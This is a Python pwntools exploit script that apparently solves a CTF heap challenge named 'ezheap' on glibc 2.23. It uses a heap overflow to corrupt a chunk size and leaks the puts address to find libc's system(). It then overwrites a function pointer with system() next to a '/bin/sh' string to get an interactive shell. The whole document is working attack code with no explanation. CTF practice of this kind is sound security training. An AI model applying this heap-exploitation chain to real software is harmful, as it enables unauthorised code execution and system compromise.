#Ubuntu GLIBC 2.23-0ubuntu11.3

from pwn import *
from LibcSearcher import LibcSearcher
context.log_level = 'debug'
elf = ELF('./ezheap')
io = gdb.debug('./ezheap')
# io = remote('node5.anna.nssctf.cn',26829)
lib = ELF('/home/bamuwe/pwn_tools/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc.so.6')
def add(idx,size,name,text):
    io.sendlineafter(b'Choice: \n',b'1')    
    io.sendlineafter(b'idx:\n',str(idx))
    io.sendlineafter(b'Size:\n',str(int(size)))
    io.sendlineafter(b'Name: \n',str(name))
    io.sendafter(b'Content:\n',text)
    
def free(idx):
    io.sendlineafter(b'Choice: \n',b'2')
    io.sendlineafter(b'idx:\n',str(idx))
    
def show(idx):
    io.sendlineafter(b'Choice: \n',b'3')    
    io.sendlineafter(b'idx:\n',str(idx))
    
def edit(idx,size,text):
    io.sendlineafter(b'Choice: \n',b'4')
    io.sendlineafter(b'idx:\n',str(idx))
    io.sendlineafter(b'Size:\n',str(int(size)))
    io.send(text)

add(0,0x18,b'0'*0x10,b'0000')
add(1,0x10,'1111',b'1111')
add(2,0x10,'2222',b'2222')

edit(0,0x20,b'A'*0x18+p8(0x81))
show(0)
free(1)
add(4,0x70,'4444',b'4'*(0x20-1)+b'-')
show(4)
io.recvuntil(b'-')
puts_addr = u64(io.recv(6).ljust(8,b'\x00'))
# lib = LibcSearcher('puts',puts_addr)
lib_base = puts_addr-lib.sym['puts']
sys_addr = lib_base+lib.sym['system']
# lib_base = puts_addr-lib.dump('puts')
# sys_addr = lib_base+lib.dump('system')
success('&system=>{}'.format(hex(sys_addr)))
success('&puts=>{}'.format(hex(puts_addr)))

edit(4,0x100,b'a'*0x40+p64(0)+p64(0x31)+b'/bin/sh\x00'+p64(0)*2+p64(0x1)+p64(sys_addr))
show(2)

io.interactive()
